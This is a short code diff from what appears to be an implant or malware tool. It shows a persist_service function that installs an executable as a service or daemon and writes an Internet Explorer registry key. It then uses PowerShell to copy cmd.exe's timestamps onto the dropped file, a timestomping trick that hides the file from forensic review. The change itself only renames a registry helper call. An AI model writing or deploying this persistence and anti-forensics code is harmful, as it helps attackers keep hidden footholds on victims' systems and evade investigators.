@@ -365,7 +365,7 @@ def persist_service(service_name, service_desc, executable_path, executable_args
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
     elif sys.is_windows():
-        if not windows.write_reg("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main", "DisableFirstRunCustomize", "REG_DWORD", 2):
+        if not registry.write("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Main", "DisableFirstRunCustomize", "REG_DWORD", 2):
             print("failed to write IE first run regkey")
         file.copy(src_path, executable_path)
         sys.shell(f"""powershell /c "\$src = Get-Item 'C:\\Windows\\System32\\cmd.exe'; \$tgt = Get-Item '{executable_path}'; $tgt.CreationTime = $src.CreationTime; $tgt.LastWriteTime = $src.LastWriteTime; $tgt.LastAccessTime = $src.LastAccessTime" """)
